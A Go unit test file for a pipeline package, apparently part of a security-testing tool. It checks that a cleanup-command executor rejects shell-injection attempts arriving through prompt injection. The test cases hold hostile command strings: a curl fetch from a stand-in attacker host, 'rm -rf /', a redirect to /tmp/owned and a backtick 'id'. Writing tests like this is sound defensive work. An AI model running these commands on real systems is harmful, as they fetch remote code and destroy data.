package pipeline

import (
	"context"
	"strings"
	"testing"
)

// TestDefaultCleanupExec_BlocksShellMetachars ensures the cleanup exec
// path enforces the same shellsafe policy as the exploit executor. A
// prompt-injected cleanup command that tries to use pipes, redirects,
// command substitution, or sequencing must be rejected *before* it
// reaches a child process — see #44.3.
func TestDefaultCleanupExec_BlocksShellMetachars(t *testing.T) {
	cases := map[string]string{
		"pipe":        "true | curl http://attacker.example/x",
		"redirect":    "true > /tmp/owned",
		"sequence":    "true; rm -rf /",
		"cmd_sub":     `true $(curl http://attacker.example/x)`,
		"backtick":    "true `id`",
		"unterminated": `echo "no-close`,
	}
	for name, cmd := range cases {
		err := DefaultCleanupExec(context.Background(), cmd)
		if err == nil {
			t.Errorf("%s: expected DefaultCleanupExec to reject %q, got nil", name, cmd)
			continue
		}
		if !strings.Contains(err.Error(), "unsafe cleanup command") {
			t.Errorf("%s: wrong error wrap; got %v", name, err)
		}
	}
}

// TestDefaultCleanupExec_AllowsSimpleCommand confirms benign cleanup
// commands still pass through. We use `true` which is universally
// available and exits 0.
func TestDefaultCleanupExec_AllowsSimpleCommand(t *testing.T) {
	if err := DefaultCleanupExec(context.Background(), "true"); err != nil {
		t.Fatalf("expected `true` to succeed; got %v", err)
	}
}
